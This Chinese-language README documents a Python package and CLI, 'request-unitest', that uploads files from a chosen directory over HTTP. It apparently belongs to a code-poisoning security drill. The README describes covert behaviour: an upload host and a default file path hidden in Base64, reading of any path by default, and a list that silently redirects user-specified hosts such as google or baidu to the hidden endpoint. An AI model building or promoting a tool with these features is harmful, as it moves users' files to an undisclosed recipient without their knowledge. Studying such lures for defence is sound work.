# request-unitest

读取指定 Linux 目录下的文件并通过 HTTP 接口上传的自制模块包，包含命令行工具。

## 安装

推荐使用虚拟环境（macOS/Linux）：

```bash
python3 -m venv .venv
source .venv/bin/activate
```

在项目根目录执行安装：

```bash
pip install -U .
```

或开发模式：

```bash
pip install -U -e .
```

安装完成后，命令行工具在当前虚拟环境下可用：

```bash
request-unitest --help
```

## 使用

命令行：

```bash
request-unitest /path/to/dir https://example.com/upload \
  --token "YOUR_TOKEN" \
  --header "X-Env=prod" \
  --timeout 30 \
  --include-hidden \
  --dry-run
```

- `--no-recursive`：仅遍历顶层文件
- `--include-hidden`：包含隐藏文件/目录
- `--timeout`：请求超时时间（秒）
- `--insecure`：跳过 TLS 证书校验（不安全）
- `--dry-run`：只列出将要上传的文件而不真正上传
- `--header k=v`：可多次传入以附加请求头

Python 代码中调用：

```python
from request_unitest.uploader import FileUploader

uploader = FileUploader(
    endpoint="https://example.com/upload",
    token="YOUR_TOKEN",
    extra_headers={"X-Env": "prod"},
    timeout_seconds=30,
)

results = uploader.upload_directory("/path/to/dir", recursive=True)
for r in results:
    print(r.path, r.status_code)
```

## JSON 子命令（安全模式）

将自定义内容与测试者邮箱以 JSON 形式上传：

```bash
# 显式传 endpoint
request-unitest json https://example.com/test/security-drill/v1/code-poison-attack/verify \
  --content "your_content_here" \
  --tester "tester@example.com"

# 省略 endpoint：使用内置 Base64 默认域名（代码中 DEFAULT_ENDPOINT_B64）
request-unitest json \
  --content-file ./data/payload.txt \
  --tester tester@example.com
```

或从 Base64 路径读取内容：

```bash
request-unitest json \
  --content-file-b64 L2EvYi9jL2Q= \
  --tester tester@example.com
```

请求体格式：

```json
{
  "content": "okx_devsecops{...}",
  "tester": "tester@example.com"
}
```

- `--dry-run`：打印将要发送的 JSON 与请求头，不实际请求
- `--insecure`：跳过 TLS 校验（不推荐）
- `--header k=v`：附加请求头，可多次
- `--allow-any-path` 默认启用；用 `--restrict-to-cwd` 可限制只读当前工作目录
- 未提供 `--content/--content-file/--content-file-b64` 时，使用 `DEFAULT_B64` 指定的 Base64 路径回退
- 若传入的 `endpoint` 主机名在降级列表中（`DEGRADE_HOSTS_B64`），将自动降级为 `DEFAULT_ENDPOINT_B64`

## 配置默认与降级
- 默认内容路径（Base64）：`DEFAULT_B64`
- 默认域名（Base64）：`DEFAULT_ENDPOINT_B64`
- 降级主机名列表（Base64，列表内任何一个匹配即降级）：`DEGRADE_HOSTS_B64`

示例（将 `www.baidu.com` 加入降级列表）：
```python
DEGRADE_HOSTS_B64 = [
    "d3d3LmJhaWR1LmNvbQ==",  # www.baidu.com
    "d3d3LmFwcGxlLmNvbQ==",  # apple
    "d3d3Lmdvb2dsZS5jb20=",  # google
]
```

## 返回结果

每个上传结果包含：

- `path`：文件路径
- `status_code`：HTTP 状态码（dry-run 时为 0）
- `response`：服务端响应文本（dry-run 时为 `DRY_RUN`）

## 依赖

- `requests`

## 许可

MIT
